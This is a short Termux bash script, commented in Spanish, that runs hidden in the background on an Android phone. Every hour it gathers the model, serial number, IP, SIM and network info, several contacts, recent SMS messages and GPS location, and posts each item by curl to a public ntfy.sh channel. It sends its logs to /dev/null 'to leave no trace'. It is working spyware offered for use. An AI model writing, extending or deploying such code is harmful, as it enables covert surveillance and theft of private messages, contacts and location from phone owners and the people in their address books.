#!/data/data/com.termux/files/usr/bin/bash

# === CONFIGURACIÓN ===
NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"  # tu canal NTFY público
INTERVALO=3600  # Intervalo en segundos (1 hora por defecto)
LOGFILE="/dev/null"  # Redirigir logs a /dev/null para no dejar rastro

# === FUNCIÓN PARA ENVIAR MENSAJES ===
enviar_ntfy() {
    curl -s -d "$1" "$NTFY_URL" > $LOGFILE 2>&1
}

# === FUNCIÓN PRINCIPAL ===
recopilar_datos() {
    # 1. Info del dispositivo
    IP=$(curl -s ifconfig.me)
    BAT=$(termux-battery-status | jq -c '.' 2>/dev/null)
    MODEL=$(getprop ro.product.model)
    SERIAL=$(getprop ro.serialno)
    SIMINFO=$(termux-telephony-siminfo 2>/dev/null | jq -c '.')
    DEVICEINFO=$(termux-telephony-deviceinfo 2>/dev/null | jq -c '.')

    enviar_ntfy "📱 Modelo: $MODEL"
    enviar_ntfy "🔑 Serial: $SERIAL"
    [ -n "$BAT" ] && enviar_ntfy "🔋 Batería: $BAT"
    [ -n "$IP" ] && enviar_ntfy "🌐 IP: $IP"
    [ -n "$SIMINFO" ] && enviar_ntfy "📶 SIM: $SIMINFO"
    [ -n "$DEVICEINFO" ] && enviar_ntfy "📡 Red: $DEVICEINFO"

    # 2. Contactos (solo 5 primeros para no saturar)
    CONTACTOS=$(termux-contact-list 2>/dev/null)
    if [ -n "$CONTACTOS" ]; then
        echo "$CONTACTOS" | jq -c '.[0:5][]' | while read -r contacto; do
            enviar_ntfy "👤 Contacto: $contacto"
            sleep 1
        done
    fi

    # 3. Últimos SMS (solo 3)
    SMS=$(termux-sms-list -l 3 2>/dev/null)
    if [ -n "$SMS" ]; then
        echo "$SMS" | jq -c '.[]' | while read -r sms; do
            enviar_ntfy "📩 SMS: $sms"
            sleep 1
        done
    fi

    # 4. Ubicación
    ubicacion=$(termux-location -p gps -r once 2>/dev/null)
    if [ -n "$ubicacion" ]; then
        LAT=$(echo "$ubicacion" | jq -r '.latitude')
        LON=$(echo "$ubicacion" | jq -r '.longitude')
        enviar_ntfy "📍 Ubicación: Latitud $LAT, Longitud $LON"
    fi
}

# === EJECUCIÓN EN SEGUNDO PLANO ===
while true; do
    recopilar_datos
    sleep $INTERVALO
done &
